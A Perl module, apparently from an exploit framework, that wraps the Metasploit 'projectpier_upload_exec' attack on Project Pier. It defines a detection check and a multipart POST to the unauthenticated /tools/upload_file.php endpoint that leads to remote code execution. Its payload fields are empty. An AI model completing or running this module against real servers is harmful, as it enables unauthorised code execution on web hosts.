package MSFExploits::Exploits::PROJECTPIER::MSF::ProjectpierUploadExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::PROJECTPIER);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "ProjectpierUploadExec";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/tools/upload_file.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /tools/upload_file.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a vulnerability found in Project Pier.  The application's

        uploading tool does not require any authentication, which allows a malicious user

        to upload an arbitrary file onto the web server, and then cause remote code

        execution by simply requesting it. This module is known to work against Apache

        servers due to the way it handles an extension name, but the vulnerability may

        not be exploitable on others.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "projectpier_upload_exec",
  OSVDB       => 85881,
  PATH        => "__BASE__/tools/upload_file.php?",
  PATHS       => ["__BASE__/tools/upload_file.php", "pp088/"],
  PAYLOAD     => "",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The path to the web application",
  VALUE => "/pp088/",
},
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'tools/upload_file.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /tools/upload_file.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_341_340437830_2827157908',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
